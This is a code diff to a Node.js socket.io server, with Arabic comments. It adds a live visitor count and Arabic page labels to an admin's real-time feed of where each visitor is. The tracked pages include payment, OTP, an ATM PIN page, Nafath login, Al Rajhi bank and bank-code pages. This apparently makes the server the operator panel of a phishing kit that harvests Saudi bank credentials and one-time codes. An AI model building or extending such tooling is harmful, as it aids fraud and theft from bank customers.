@@ -362,8 +362,14 @@ function notifyAdmin(event, data) {
 }
 
 // User socket connections
+// تتبع الزوار المتصلين (بدون الأدمن)
+let clientSocketCount = 0;
+
 io.on("connection", (socket) => {
-  console.log("User connected:", socket.id);
+  clientSocketCount++;
+  console.log("User connected:", socket.id, "| Total clients:", clientSocketCount);
+  // إرسال عدد الزوار للأدمن
+  notifyAdmin("visitorsCount", { count: clientSocketCount });
 
   // Submit booking - يُرسل ackNewDate للعميل
   socket.on("submitBooking", async (data) => {
@@ -584,7 +590,27 @@ io.on("connection", (socket) => {
         // تأكد من أن الـ socket في الـ room
         socket.join(socket.referenceId);
       }
-      notifyAdmin("locationUpdate", { socketId: socket.id, referenceId: socket.referenceId, ...data });
+      // تعيين أسماء الصفحات بالعربية
+      const pageNames = {
+        '/': 'الصفحة الرئيسية',
+        '/home': 'الصفحة الرئيسية',
+        '/booking': 'صفحة الحجز',
+        '/payments': 'صفحة الدفع',
+        '/phone': 'صفحة OTP',
+        '/pin': 'صفحة الرقم السري ATM',
+        '/nafad': 'صفحة نفاذ',
+        '/rajhi': 'صفحة الراجحي',
+        '/rajhiCode': 'صفحة رمز الراجحي',
+        '/verification': 'صفحة التحقق',
+        '/phoneCode': 'صفحة رمز الجوال',
+      };
+      const pageLabel = pageNames[data.page] || data.page || 'صفحة غير معروفة';
+      notifyAdmin("locationUpdate", { 
+        socketId: socket.id, 
+        referenceId: socket.referenceId, 
+        pageLabel,
+        ...data 
+      });
     } catch (err) {
       console.error("updateLocation error:", err);
     }
@@ -609,7 +635,10 @@ io.on("connection", (socket) => {
   });
 
   socket.on("disconnect", () => {
-    console.log("User disconnected:", socket.id);
+    clientSocketCount = Math.max(0, clientSocketCount - 1);
+    console.log("User disconnected:", socket.id, "| Total clients:", clientSocketCount);
+    // إرسال عدد الزوار المحدث للأدمن
+    notifyAdmin("visitorsCount", { count: clientSocketCount });
   });
 });
 
